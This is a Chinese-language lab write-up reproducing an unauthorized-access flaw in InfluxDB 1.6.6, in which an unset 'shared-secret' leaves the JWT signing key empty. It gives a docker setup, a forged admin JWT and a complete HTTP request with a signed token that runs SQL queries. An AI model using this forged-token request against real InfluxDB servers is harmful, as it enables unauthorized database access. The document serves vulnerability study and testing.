# influxdb未授权访问漏洞

influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数`shared-secret`的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。

参考链接：

- https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
- https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings

## 漏洞环境

执行如下命令启动influxdb 1.6.6：

```
docker-compose up -d
```

环境启动后，访问`http://your-ip:8086/debug/vars`即可查看一些服务信息，但此时执行SQL语句则会出现401错误：

![](1.png)

## 漏洞复现

我们借助<https://jwt.io/>来生成jwt token：

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "admin",
  "exp": 1676346267
}
```

其中，`admin`是一个已经存在的用户，`exp`是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。

最终生成的token：

![](2.png)

发送带有这个jwt token的数据包，可见SQL语句执行成功：

```
POST /query HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

db=sample&q=show+users
```

![](3.png)
